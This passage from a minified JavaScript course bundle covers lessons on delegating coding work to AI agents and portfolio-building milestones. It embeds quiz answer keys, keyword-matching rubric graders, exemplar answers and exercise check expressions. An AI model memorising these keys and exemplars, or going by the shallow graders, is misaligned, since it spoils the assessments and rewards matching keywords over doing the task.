orders?"'],answer:2,explanation:"The blast radius is the set of files whose behaviour depends on the field — including ones a grep might miss because they destructure or pass it along."}]},{id:"managing-context",title:"Managing Context: What Goes In, What Stays Out",minutes:11,body:`The context window is a budget, and every serious tool treats it as one. What you put in decides what the agent can still hold in mind.

**The minimal context pack.** For a task, include:
- the files that will change and the one or two they depend on,
- the error or failing test, in full, once,
- the decision you already made, so it doesn't relitigate it.

**Summarise, don't paste.** A 600-line log is not context; it is noise with occasional signal. Paste the exception and the three lines around it. When history matters, write the summary yourself — a compaction summary that drops the failing test's name is worse than no summary.

**Context rot is real.** A stale error from forty messages ago gets "fixed" again. When the situation changes, restate it; one clear message beats five corrections scattered through a transcript.

The test: if a new teammate read only your context pack, could they start the task? If yes, it is enough. If no, adding more raw material rarely helps — adding *the right* material does.`,quiz:[{q:"You're asking an agent to fix a failing test. Which context pack is minimal and sufficient?",options:["The failing test output, the file under test, and any module it imports directly","The whole repository, so nothing is missed","The last 600 lines of CI logs","The test output plus a one-line summary of every file in the project"],answer:0,explanation:"The test, the file, and its direct dependencies are the working set. Everything else is noise the agent has to hold — and pay for — while working."},{q:"An agent's draft compaction summary of a long debugging session drops the name of the failing test. Why is that dangerous?",options:["It makes the summary shorter than the limit","The failing test defined the task; without it the agent re-fixes something else, confidently","It's fine — the test can be rediscovered later","It wastes context either way"],answer:1,explanation:"The failing test is the acceptance criterion. Losing it during compaction silently changes the task, and the agent will do the new, wrong one well."},{q:"When should you restate the situation instead of adding to the transcript?",options:["Never — history is always valuable","Every message, to be safe","When the situation has changed enough that older messages mislead","Only when the model complains"],answer:2,explanation:"Context rot: stale errors and superseded decisions get acted on. A short, current restatement is worth more than the raw history it replaces."}],rubric:{id:"compaction-summary",title:"Write the compaction summary",prompt:"Summarise this debugging session so work can continue after compaction.",brief:"Keep the failing test name, the reproduction, and the open decision — and drop the raw logs.",minWords:70,criteria:[{id:"failure",label:"Names the failing test or the exact failure",check:'output.includes("test") && output.includes("fail")'},{id:"repro",label:"Includes the reproduction (the steps that trigger it)",check:'output.includes("repro") || output.includes("steps") || output.includes("trigger")'},{id:"decision",label:"Keeps the open decision or the chosen next step",check:'output.includes("decision") || output.includes("open question") || output.includes("next")'},{id:"dropLogs",label:"Drops the raw logs and keeps only what matters"}],exemplar:`Failing test: checkout.summary.spec.ts › "renders an empty cart without crashing".

Reproduction: add nothing to the cart, open /checkout. The API now returns { order: null }; orderSummary() assumes an object and throws while reading order.total.

What we know: the failure started with the 14:20 deploy that changed the empty-cart response shape.
Open decision: is an empty cart a valid UI state, or should the API keep returning an empty object?
Next: reproduce on the branch, then fix the read in src/checkout/summary.ts.

Dropped: the 400-line network log and an unrelated flaky-timeout investigation.`}},{id:"instruction-files",title:"Project Instruction Files: Teaching an Agent Your Conventions",minutes:12,body:`Every agent session starts ignorant of your project. A **project instruction file** (the name differs by tool) is how it inherits the conventions instead of re-learning — or inventing — them each time.

**What belongs in the file:**
- setup, build, and test commands that actually exist,
- directory ownership ("UI components live in src/components; no fetch calls there"),
- style rules with a reason, so they apply to cases the rule didn't name,
- hard boundaries ("never touch migrations without a human reviewer"),
- what a change must include before it is reviewable (a test, a changelog entry).

**What doesn't:**
- one-off task details — those belong in the session prompt,
- aspirational rules nobody enforces ("write clean code"),
- anything that contradicts the actual scripts. A stale command is worse than no command: the agent runs it, it fails, and it "fixes" the project instead of the file.

**Treat the file as code.** It is updated in the same pull request that changes the convention it describes. A rules file that lags the repo is a bug generator.`,quiz:[{q:'"Build with pnpm; `pnpm test` runs vitest; `pnpm lint` is required before review." Where does this line belong?',options:["In the project instruction file — a durable build/test convention","In today's session prompt — it's about the current task","Nowhere — the agent can discover it by looking","In the README only"],answer:0,explanation:"Stable commands and gates are exactly what the instruction file carries; repeating them per session is the cost it removes."},{q:'"Today: add a delete button to the orders table." Where does that belong?',options:["The project instruction file, under Task Notes","The session prompt","Nowhere","A code comment in the orders component"],answer:1,explanation:"One-off task detail is session context. Written into the rules file it becomes a diary no future session should read."},{q:`"We value clean, maintainable code." What's wrong with putting this in the instruction file?`,options:["Nothing — values set the tone","It's aspirational and unenforceable, so it changes no decision and dilutes the rules that do","It's too short to be useful","It should be bolded"],answer:1,explanation:"Rules earn their place by changing behaviour. 'Be careful' competes for attention with 'never edit migrations without review' — and loses nothing when ignored."},{q:"A PR adds a new convention and updates the instruction file in the same change. Why does that matter?",options:["Reviewers prefer bigger pull requests","The file is code: shipping the convention without it leaves every future session with a stale map","It isn't required, but it is polite","Because the file is auto-generated"],answer:1,explanation:"A rules file that trails the repo is a bug generator — the next agent inherits a false rule and follows it confidently."},{q:'"Renderer caches are stale after a soft reload; clear them before screenshot tests." Where does this belong?',options:["In the project instruction file — a durable, decision-changing gotcha","In the session prompt every single time","Nowhere — it's a workaround","Only in the test file"],answer:0,explanation:"It is stable, it changes what an agent does, and otherwise it gets rediscovered painfully every few sessions."}],rubric:{id:"instruction-file",title:"Write the rules file",prompt:"Write the project instruction file for this repository.",brief:"Fact sheet: pnpm + vitest, components in src/components, PR titles are `type: summary`, secrets live in .env and are never committed, and there is one known renderer-cache gotcha. Keep it under ~40 lines.",minWords:60,criteria:[{id:"commands",label:"Names the package manager and its real commands",check:'output.includes("pnpm")'},{id:"tests",label:"Names the test runner used for verification",check:'output.includes("vitest")'},{id:"secrets",label:"States the secrets boundary (.env is never committed)",check:'output.includes(".env")'},{id:"boundaries",label:"States hard boundaries as rules, not suggestions"},{id:"budget",label:"Fits the budget and leaves one-off task detail out"}],exemplar:`# Project rules

## Commands
- Install and build with pnpm.
- Tests: \`pnpm test\` (vitest). A change is not reviewable without a test that fails first.
- Lint: \`pnpm lint\` must pass before review.

## Layout
- React components live in \`src/components\`. No data fetching in that folder.
- Shared utilities live in \`src/lib\` and are imported, never duplicated.

## Conventions
- PR titles: \`type: summary\` (feat, fix, chore, docs).
- New behaviour ships with a test in the same PR.

## Boundaries
- Never commit secrets. \`.env\` stays local; \`.env.example\` is the committed contract.
- Never edit migrations or CI configuration without a human reviewer.

## Gotcha
- Renderer caches survive a soft reload. Clear them before screenshot tests, or the diff is a lie.`}},{id:"plan-before-code",title:"Plan Before Code: The Cheapest Place to Catch a Misunderstanding",minutes:11,body:`The approval loop is: task → agent plan → **you read the plan** → approve or correct. It is the highest-leverage review in the whole workflow, because rejecting a plan costs a message while rejecting a diff costs a rewrite, a review cycle, and a broken build.

**Read the plan for three things:**
1. **Missing steps** — the plan updates one query but never audits the others that read the same data.
2. **Wrong files** — the change lands in the page component when the rule belongs in the service.
3. **Out-of-scope intent** — "while I'm here" refactors, silent migrations, and destructive cleanup nobody asked for.

**What plans lie about:**
- \`"run the tests"\` without naming which tests, or what they must prove,
- a \`"cleanup"\` step that deletes rows a reversible feature should keep,
- \`"update queries"\` singular, when the codebase has six read paths.

A plan is a proposal about *what the change is*, not a formality before it. If you can't find a flaw in a plan for a non-trivial change, you probably haven't read it yet.`,quiz:[{q:'Plan step: "Add a deletedAt column and an index on it."',options:["Approve as written","Revise — EC (a path or case is missing)","Revise — SC (out of scope / destructive intent)","Revise — TG (the verification is vacuous)"],answer:0,explanation:"The column plus its index is exactly what a soft delete needs first; the read filters depend on it."},{q:'Plan step: "Update listProjects to filter out deleted rows."',options:["Approve as written","Revise — EC (a path or case is missing)","Revise — SC (out of scope / destructive intent)","Revise — TG (the verification is vacuous)"],answer:1,explanation:"Soft delete means every read path must filter. The plan names one query and never audits the others — deleted projects keep leaking through dashboards, exports, and admin views."},{q:'Plan step: "Delete the related project_members rows for the project."',options:["Approve as written","Revise — EC (a path or case is missing)","Revise — SC (out of scope / destructive intent)","Revise — TG (the verification is vacuous)"],answer:2,explanation:"Soft delete is reversible by definition. Dropping membership rows is a destructive behaviour change nobody asked for — the classic out-of-scope step found at plan time for the price of a message."},{q:'Plan step: "Update the projects page so deleted projects disappear from the list."',options:["Approve as written","Revise — EC (a path or case is missing)","Revise — SC (out of scope / destructive intent)","Revise — TG (the verification is vacuous)"],answer:0,explanation:"In scope and correctly placed: the UI reflects the filter rather than reimplementing the rule."},{q:'Plan step: "Backfill: mark existing archived projects with deletedAt."',options:["Approve as written","Revise — EC (a path or case is missing)","Revise — SC (out of scope / destructive intent)","Revise — TG (the verification is vacuous)"],answer:0,explanation:"A data migration that keeps the old archived state consistent is part of shipping the feature, not scope creep — and it is additive, not destructive."},{q:`The plan's verification reads: "run the tests." Approve or revise, and why?`,options:["Approve — which tests can be decided later","Revise — name the specific tests and the failing-first reproduction","Revise — tests are unnecessary for a soft delete","Approve — the CI pipeline will run something"],answer:1,explanation:"A verification step that names nothing cannot fail. The plan should say which test proves soft delete works and which test proves the rows survive a restore."}]},{id:"permissions-and-sandbox",title:"Permissions & Sandbox Settings: Least Privilege for an Unattended Tool",minutes:12,body:`Agents run with capabilities, and every capability has a blast radius. Choosing them is a session decision, not a preference:

- **Read** — inspect files and history. Almost always safe; this is where investigation and review live.
- **Write** — edit the working tree. Safe when bounded to a branch; never point it at a shared or protected branch unattended.
- **Execute** — run commands and tests. Necessary for "make the tests pass"; risky when the project can deploy or migrate by accident.
- **Network** — fetch dependencies and call APIs. Grant it when the task genuinely needs it, because it is also how data leaves the machine.

**Least privilege is the default.** Start read-only for investigation and review, add write for a bounded feature branch, add execute when the task is "make it pass". Expand deliberately — one session, one reason.

**Always human:** deploys, destructive commands, credential operations, anything touching production data. A capability that can do those unattended is not a convenience; it is an incident waiting for a typo.

Ask before granting anything: *if this goes wrong at 2am, what is the worst thing it can have done?* Grant only the level whose answer you can live with.`,quiz:[{q:'Task: "Explain how billing rounds prices." Minimal permission profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:0,explanation:"Investigation is the read-only case: no writes, no commands, nothing to undo."},{q:'Task: "Upgrade the router to v7 and fix the fallout." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:2,explanation:"It has to edit and run the suite to fix the fallout — but on a branch, not a protected one. Execute is what lets it verify its own work."},{q:'Task: "Run the migration suite against the staging database." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:3,explanation:"Migrations against shared infrastructure are exactly the 'always human' list: irreversible, shared, and not yours to spend."},{q:'Task: "Rename an internal utility across the repository." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:1,explanation:"Mechanical and compiler-verified: it needs writes, not the ability to run arbitrary commands or reach the network."},{q:'Task: "Trace a production stack trace to the file that owns the failing function." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:0,explanation:"Tracing is reading. Nothing about locating the owner of a function requires the ability to change or run anything."},{q:'Task: "Fix the failing tests in the module you are working on." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:2,explanation:"'Fix the failing tests' means run, read, edit, run again. Execute is the capability that closes that loop — on your branch."},{q:'Task: "Issue a refund from the payments dashboard." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:3,explanation:"Money out the door is a human operation. No permission profile makes an unattended refund acceptable."},{q:'Task: "Update the README install steps." Minimal profile?',options:["Read-only","Read + write (bounded branch)","Read + write + execute","Do not delegate — needs a human"],answer:1,explanation:"A documentation edit needs writes and nothing else — no commands, no network."}]},{id:"verifying-agent-output",title:"Verifying Agent Output: Tests Are the Review You Can't Skip",minutes:13,body:`"Tested locally" is a claim, not evidence. Agent output is a **draft**, and the review you cannot skip is the one a machine performs: a test that fails on the draft and passes on the fix.

**The verification loop:**
1. **Read the diff first** — the whole change, not the summary the agent wrote about it.
2. **Ask what evidence would prove it** — a test, a type check, a query plan, a benchmark.
3. **Write or request that evidence before accepting** — a test that already passes proves nothing.
4. **Run it against the draft** — if it passes immediately, your test is wrong.

**What blocks a merge, even when the code is correct:**
- a change that touches files the task never mentioned (scope),
- a "test" that asserts nothing (verification theatre),
- a name or comment that now describes the old behaviour,
- leftover debug output — a nit, unless it leaks data or bypasses a guard.

That is the same taxonomy you have been practising all along. The only difference in review is that the defect sits inside a multi-file surface, and finding the line is part of the job.`,debug:vi("csv-quoted-fields"),diff:UP("agent-pr-search-race"),quiz:[{q:`An agent's pull request says "tested locally". What has been proven?`,options:["The change works — the agent ran it","Nothing yet: until you can see the test, and it fails on the draft, it is a claim about a session you cannot observe","The change is safe to merge","That a test exists somewhere in the branch"],answer:1,explanation:"You cannot review a session you did not see. The artefact is the test: it must exist, and it must fail on the draft before the fix."},{q:"The agent's PR is functionally correct, but it also reformats three unrelated files. What do you do?",options:["Approve — the code is correct, and formatting is harmless","Block — unrelated changes hide the real diff and should be split out before review","Block only if a test fails","Approve and fix the formatting yourself"],answer:1,explanation:"Scope is not a bug in the code, it is a bug in the change: an unreviewable diff is how a real defect gets approved by accident."},{q:"A test was added that asserts only `expect(result).toBeDefined()`. What is wrong with it?",options:["Nothing — it is a smoke test","It cannot fail for the reason it claims to guard, so it proves nothing about behaviour","It is too slow","It should use toBeTruthy instead"],answer:1,explanation:"An assertion that the wrong implementation also satisfies is theatre. The test must fail on the broken behaviour — otherwise it certifies nothing."}]},{id:"when-not-to-use-agents",title:"Knowing When Not to Use an Agent",minutes:10,body:`Agents are reliable where the task is **verifiable and mechanical**, and unreliable where the task is **novel or judgment-bound**. Classifying the task is the skill.

- **Delegate** — boilerplate with a known shape (a CRUD endpoint, test scaffolding), and mechanical renames the compiler checks for you.
- **Delegate with tests** — trusted work whose failure modes matter: auth checks, dependency upgrades, performance work with a budget. The tests are the contract, not ceremony.
- **Keep it human** — novel algorithms, decisions with irreversible blast radius, and anything that is not yet a verifiable request. "Make it feel snappier" is a wish, not a task: spec it first, then decide.

The signals: *Can I state the acceptance criterion as something a machine can check? Is the shape of the solution known in advance? If it goes wrong, what is the worst it can have done?* Two yeses and a survivable worst case means delegate. Otherwise the cost of correcting it exceeds the cost of doing it.`,quiz:[{q:"Task: a boilerplate CRUD endpoint for a new resource.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:0,explanation:"A known shape, a known pattern, and mistakes are visible immediately. This is the canonical delegate case."},{q:"Task: a novel consensus algorithm for a distributed lock.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:2,explanation:"Novel algorithms have no correct pattern to imitate and subtle invariants that tests are hard to write for. This is design work, not boilerplate."},{q:"Task: rename a function across 200 files.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:0,explanation:"Mechanical and compiler-verified: the type checker finds every miss. No judgment to review, so no tests needed."},{q:"Task: cut a hot loop's cost to fit an existing performance budget.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:1,explanation:"Viable to delegate, but only with the benchmark as the acceptance criterion — otherwise 'faster' is unverifiable and easy to fake."},{q:"Task: add an authorization check to a new admin route.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:1,explanation:"Security-sensitive work is delegate-able when a test proves the denied case, not just the allowed one. The failure mode is silent, so the evidence matters more than the speed."},{q:"Task: write the test scaffolding for a module.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:0,explanation:"Scaffolding is shape work — the runner, the fixtures, the naming — and you review the assertions as you use them."},{q:"Task: a major dependency upgrade with breaking changes.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:1,explanation:"Broad and mechanical, but every break is a behaviour change: delegate only with the existing suite as the contract."},{q:"Task: make the app feel snappier.",options:["Delegate","Delegate — with tests that pin the behaviour","Keep it human"],answer:2,explanation:"It is not a task yet — there is no measurement and no definition of done. Spec it first; the classification follows from the spec."}]},{id:"capstone-agent-loop",title:"Capstone: Run the Full Agent Loop",minutes:22,body:`Everything in this track, in one loop:

**spec → context → draft → verify → fix → proof.**

Below is an agent-drafted debounced search queue with **two** planted defects. Your job is the whole loop, not the repair:

1. **Spec it.** Write the acceptance criteria you are holding the draft to (one line each).
2. **Trace the draft.** Which line breaks them? Name the taxonomy category.
3. **Repair it.** Make the program behave — both defects, not the loudest one.
4. **Prove it.** Write the verification note: what was wrong, which test or observable behaviour proves the fix, and what a reviewer should check.

A defect you find but cannot explain is a defect you will ship again next month. The note is the part that makes the fix yours.`,debug:vi("debounced-search-queue"),rubric:{id:"capstone-note",title:"The verification note",prompt:"Write the note a reviewer would need in order to trust this fix.",brief:"Name both defects and their taxonomy categories, the test or observable behaviour that proves the fix, and the spec you held the draft to.",minWords:80,criteria:[{id:"race",label:"Names the stale-response race (or out-of-order results) as a concurrency bug",check:'output.includes("race") || output.includes("stale") || output.includes("out of order")'},{id:"empty",label:"Names the empty-query defect",check:'output.includes("empty") || output.includes("blank") || output.includes("no query")'},{id:"proof",label:"States the test or observable behaviour that proves the fix",check:'output.includes("test") || output.includes("applied:") || output.includes("proves") || output.includes("proof")'},{id:"spec",label:"Names the acceptance criteria the draft was verified against"},{id:"reviewer",label:"Tells the reviewer which line or behaviour to check"}],exemplar:`Two defects in the drafted search queue.

1. Race condition (RC): the response handler applied results without checking whether the request was still the newest one. Searches for "a" and "alp" were both in flight, and "a" resolved *after* "alp", so the stale results won. Fix: stamp each request with an id and ignore any response that is not the latest.

2. Edge case (EC): the queue fired a request for the empty string. An empty query has no results and never should have become a request. Fix: return early when the query is falsy.

Spec it was verified against: (a) only the newest query's results are ever applied, in any resolution order; (b) an empty query produces no request at all.

Proof: with the fix, the request log shows only "a" and "alp", the final applied value is "alp-result", and the guard skips the late "a" response. A reviewer should check the guard line and the early return, then watch the request log — the running program is the evidence.`},quiz:[{q:"What is the full agent loop this capstone runs?",options:["Prompt → paste → accept → ship","Spec → context → draft → verify → fix → proof","Draft → commit → review → revert","Spec → draft → merge"],answer:1,explanation:"The loop ends in proof, not in a merge: the note and the test are what turn a plausible draft into a reviewed change."},{q:"Why write the verification note when the bug is already fixed?",options:["To satisfy a process requirement","Because writing the cause down is how you find out whether you actually understood it — an unexplained fix ships again","Because a reviewer cannot read the diff","To increase the pull request size"],answer:1,explanation:"The note is the explanation test. If you cannot say which category the defect belongs to and what proves the fix, you fixed a symptom."},{q:"The draft fires a request for an empty query. Which taxonomy category is that?",options:["RC — race condition","EC — missing or mishandled edge case","SL — silently wrong logic","CX — bad complexity"],answer:1,explanation:"The empty string is the classic unhandled input: nothing crashes, the code just does work it should never have started."}]}]},GP={"web/es6-syntax":"off-by-one","dsa/big-o":"quadratic-dedupe","react/hooks-effect":"invented-helpers","backend/api-security":"trusted-role-header"};function KP(e){return{...e,lessons:e.lessons.map(t=>{const n=GP[`${e.id}/${t.id}`];return n?{...t,debug:vi(n)}:t})}}const Dt=[AP,EP,RP,PP,qP,OP,IP,NP,jP,MP,LP,DP,_P,FP,BP,QP].map(KP);function Bb(e){return Dt.find(t=>t.id===e)}function YP(e,t){var n;return(n=Bb(e))==null?void 0:n.lessons.find(s=>s.id===t)}function XP(e,t){return e+"/"+t}const Vb=Dt.reduce((e,t)=>e+t.lessons.length,0),pI={title:"The Continuous Portfolio",blurb:"One project, built across the whole curriculum. Every milestone adds a functional component to a site you actually deploy — nothing here is throwaway practice.",repoHint:"Name it portfolio — it becomes the first link on your CV."},el=[{id:"m-shell",title:"Semantic Page Shell",phase:"Phase 1 · Structure",icon:"⬚",brief:"Start the project as a real document: landmarks, a heading hierarchy that makes sense, and no accessibility shortcuts.",skills:["web/html-semantic","web/box-model-deep"],deliverables:["A working index.html with header, nav, main and footer landmarks","Exactly one h1, with no skipped heading levels below it","Descriptive alt text on every image and discernible text on every link","Opens in a browser with an empty console"],xp:150,badge:{id:"ms-shell",icon:"⬚",title:"Foundation Layer",description:"Shipped a semantic page shell for the portfolio."},proof:{kind:"preview",brief:"Build the document skeleton here first — it's graded on structure, so get the landmarks right before styling anything.",spec:{goal:"Write a header containing a nav, a main containing an h1, and a footer — all as direct children of the body.",brief:"The bones of your portfolio. Structure is verified; styling comes in the next milestone.",html:`<!-- Build the page shell:
       <header> with a <nav> inside
       <main> with one <h1>
       <footer>
     All three are direct children of <body>. -->

`,requires:["body > header","header > nav","main > h1","body > footer"]}}},{id:"m-style",title:"Design System Layer",phase:"Phase 2 · Style",icon:"◧",brief:"Style the shell with utilities and your own tokens: responsive from 320px up, legible in dark mode, and every interactive element visibly focusable.",skills:["tailwind/utility-first","tailwind/layout-flex-grid","tailwind/responsive-dark","tailwind/design-tokens"],deliverables:["Brand colours, fonts and shadows defined as tokens in tailwind.config","A responsive card grid: one column on phones, three from md upward","Every interactive element has a focus-visible treatment","Dark mode is readable — AA contrast on body copy in both themes","Spacing comes from the scale, with no one-off pixel values"],xp:250,badge:{id:"ms-style",icon:"◧",title:"Design System",description:"Styled the portfolio with a token-based utility system."},proof:{kind:"preview",brief:"Rebuild your card grid in isolation and apply the layout, dark-mode and focus classes. The preview re-renders as you type.",spec:{goal:"Give .grid the classes grid, gap-6 and md:grid-cols-3, add at least two .card children, apply dark:bg-slate-900 to the cards, and focus-visible:ring-2 to the button.",brief:"The responsive, dark-mode-aware card grid — graded on the classes you actually apply.",framework:"tailwind",html:`<main class="min-h-screen bg-white p-8 dark:bg-slate-950">
  <div class="grid mx-auto max-w-4xl">
    <article class="card rounded-2xl border border-slate-200 bg-white p-6">
      <h2 class="font-semibold">Project one</h2>
      <p class="text-slate-600">What it does and why it exists.</p>
      <button class="mt-4 rounded-full px-4 py-2">View</button>
    </article>
    <article class="card rounded-2xl border border-slate-200 bg-white p-6">
      <h2 class="font-semibold">Project two</h2>
      <p class="text-slate-600">The stack you chose and why.</p>
      <button class="mt-4 rounded-full px-4 py-2">View</button>
    </article>
  </div>
</main>`,requires:[".grid.md\\:grid-cols-3",".grid.gap-6",".card.dark\\:bg-slate-900","button.focus-visible\\:ring-2"]}}},{id:"m-interactive",title:"Interactive Component",phase:"Phase 3 · Interactivity",icon:"◈",brief:"Add the first piece of real behaviour: a stateful component the visitor can actually operate, with correct immutable updates underneath.",skills:["react/jsx-vdom","react/props-state","react/hooks-effect","web/dom-events"],deliverables:["One React component with local state","A controlled input wired to value + onChange","A list rendered with stable keys, not array indexes","Every immutable update goes through a copied data structure","No React warnings or key errors in the console"],xp:300,badge:{id:"ms-interactive",icon:"◈",title:"Interactive",description:"Built a stateful component with correct immutable updates."},proof:{kind:"code",brief:"The logic inside that component, isolated. Immutable add / toggle / remove — the part that breaks in real apps.",starter:`// The data logic behind your interactive component.
// Every operation must return a NEW array and leave the input untouched.
function add(todos, text) {
  // TODO: return a new array with { id, text, done: false } appended
  return todos;
}

function toggle(todos, id) {
  // TODO: return a new array with the matching todo's done flipped
  return todos;
}

function remove(todos, id) {
  // TODO: return a new array with the matching todo removed
  return todos;
}

const start = [{ id: 1, text: "read", done: false }];

const added = add(start, "ship");
console.log("after add:", added.length, added[1] && added[1].text);
console.log("original untouched:", start.length);

const toggled = toggle(added, 1);
console.log("toggled:", toggled[0].done, "untouched:", added[0].done);

const removed = remove(toggled, 1);
console.log("after remove:", removed.length, removed.map((t) => t.text).join(","));`,check:{expr:'output.includes("after add: 2 ship") && output.includes("original untouched: 1") && output.includes("toggled: true untouched: false") && output.includes("after remove: 1 ship")',hint:"Spread the array for add, map for toggle, filter for remove. The original array must never change.",hints:[{tier:1,text:"Returning the input means nothing changed. Each function hands back a brand-new array."},{tier:2,text:"add → `[...todos, newTodo]`. toggle → `map` with a spread on the match. remove → `filter` by id."},{tier:3,text:"toggle: `todos.map((t) => t.id === id ? { ...t, done: !t.done } : t)`."}]}}},{id:"m-data",title:"Live Data Layer",phase:"Phase 4 · Data",icon:"◉",brief:"Make the portfolio dynamic: pull real content from an API and handle every state a network can put you in.",skills:["api/http-verbs","api/fetch-async","api/loading-errors","api/abort-races"],deliverables:["Data loaded with fetch, with res.ok checked before parsing","All four states handled: loading, error, empty and ready","Cached content stays on screen when a background refetch fails","In-flight requests aborted on unmount","Failures show human copy with a retry, never a raw error string"],xp:300,badge:{id:"ms-data",icon:"◉",title:"Live Data",description:"Wired the portfolio to a real API with all four states handled."},proof:{kind:"code",brief:"The render decision for your data-backed view. Getting the order right is what stops a failed refetch from blanking the screen.",starter:`// Decide what a data-backed view should render.
// Return exactly one of: "loading" | "error" | "empty" | "ready".
//
// Rules:
//  - no data yet + an error        → "error"
//  - no data yet + still loading   → "loading"
//  - data present but empty ([])   → "empty"
//  - data present and non-empty    → "ready"
//  - a background refetch (loading OR error) with data already
//    present must still render "ready" — never blank the screen.
function viewState({ loading, error, data }) {
  // TODO
  return "ready";
}

console.log("first load:", viewState({ loading: true, error: null, data: null }));
console.log("hard error:", viewState({ loading: false, error: "boom", data: null }));
console.log("empty result:", viewState({ loading: false, error: null, data: [] }));
console.log("ready:", viewState({ loading: false, error: null, data: [1] }));

const cached = [1];
console.log("refetching, cached:", viewState({ loading: true, error: null, data: cached }));
console.log("refetch failed, cached:", viewState({ loading: false, error: "boom", data: cached }));`,check:{expr:'output.includes("first load: loading") && output.includes("hard error: error") && output.includes("empty result: empty") && output.includes("ready: ready") && output.includes("refetching, cached: ready") && output.includes("refetch failed, cached: ready")',hint:"Check `data` first: with no data, an error wins over loading. With data, only an empty array changes the answer — a failed refetch keeps showing what you have.",hints:[{tier:1,text:"The presence of `data` is the first fork. Everything else branches from there."},{tier:2,text:`No data: return "error" if there's an error, otherwise "loading". Data present: "empty" when the length is 0, otherwise "ready".`},{tier:3,text:'`if (!data) return error ? "error" : "loading"; return data.length ? "ready" : "empty";`'}]}}},{id:"m-persist",title:"Persistent State",phase:"Phase 5 · State",icon:"⟳",brief:"Give the visitor something that survives a refresh — theme choice, saved items, a draft — via a store you control rather than prop-drilling.",skills:["state/state-shapes","state/usereducer","state/external-stores"],deliverables:["An external store exposing getState / setState / subscribe","State persisted to localStorage and restored on load","setState bails out when nothing actually changed","Components unsubscribe on unmount — no leaked listeners","A refresh leaves the UI exactly as the visitor left it"],xp:350,badge:{id:"ms-persist",icon:"⟳",title:"Persistent",description:"Built an external store that survives a refresh."},proof:{kind:"code",brief:"The store underneath your persistence layer: merge, persist, notify — and only when something genuinely changed.",starter:`// A store that persists through an injected storage adapter.
function createStore(initial, storage) {
  let state = initial;
  const listeners = new Set();

  return {
    getState: () => state,

    setState(partial) {
      // TODO: merge \`partial\` into state, write it through storage.set,
      // and notify listeners ONLY when a value actually changed.
    },

    subscribe(fn) {
      listeners.add(fn);
      return () => listeners.delete(fn);
    },
  };
}

const writes = [];
const storage = { set: (json) => writes.push(json) };

const store = createStore({ count: 0 }, storage);
let notifications = 0;
const unsubscribe = store.subscribe(() => {
  notifications += 1;
});

store.setState({ count: 1 });
store.setState({ count: 1 }); // identical — must not notify or persist
store.setState({ count: 2 });

unsubscribe();
store.setState({ count: 3 }); // nobody is listening now

console.log("notifications:", notifications);
console.log("storage writes:", writes.length);
console.log("final count:", store.getState().count);`,check:{expr:'output.includes("notifications: 2") && output.includes("storage writes: 3") && output.includes("final count: 3")',hint:"Two real changes call the listeners twice. Every real change persists, including the last one — it has no listener, but it still belongs in storage, so expect three writes. The identical write touches neither.",hints:[{tier:1,text:"Build the next state, compare it with the current one, and only then do the storing and notifying."},{tier:2,text:"Compare the merged result against the existing state before committing: if every field matches, return early."},{tier:3,text:"`const next = { ...state, ...partial }; if (JSON.stringify(next) === JSON.stringify(state)) return; state = next; storage.set(JSON.stringify(next)); for (const fn of listeners) fn();`"}]}}},{id:"m-ship",title:"Ship It",phase:"Phase 6 · Delivery",icon:"▲",brief:"Publish it. A public repository with a history that reads like a professional's, a README a stranger can follow, and a live URL you can send to anyone.",skills:["git/git-basics","git/git-branches","git/git-workflow-lab"],deliverables:["A public repository with a real commit history, not one bulk commit","Work done on a feature branch and merged — not straight to main","A README covering what it is, why it exists and how to run it","Deployed at a live URL that loads without errors","That URL is on your CV, your GitHub profile and your LinkedIn"],xp:400,badge:{id:"ms-ship",icon:"▲",title:"Shipped",description:"Deployed the portfolio project and published the repo."},proof:{kind:"code",brief:"Your commit history is part of the work you're showing. Grade a sample the way a reviewer would.",starter:`// A reviewer skims your log before they read your code.
// A message is WELL-FORMED when it has at least 3 space-separated
// words AND contains no placeholder word (case-insensitive, ignoring
// a trailing colon) from PLACEHOLDERS.
const PLACEHOLDERS = [
  "wip", "update", "final", "stuff", "temp", "asdf", "asdfasdf",
  "todo", "misc", "changes", "fixes",
];

const COMMITS = [
  "add hero section markup",
  "fix: guard against empty data in the list",
  "wip",
  "update",
  "feat: add project milestones page",
  "final final v2",
];

function qualityCount(messages) {
  // TODO: count how many messages are well-formed.
  return 0;
}

console.log("well-formed commits:", qualityCount(COMMITS));
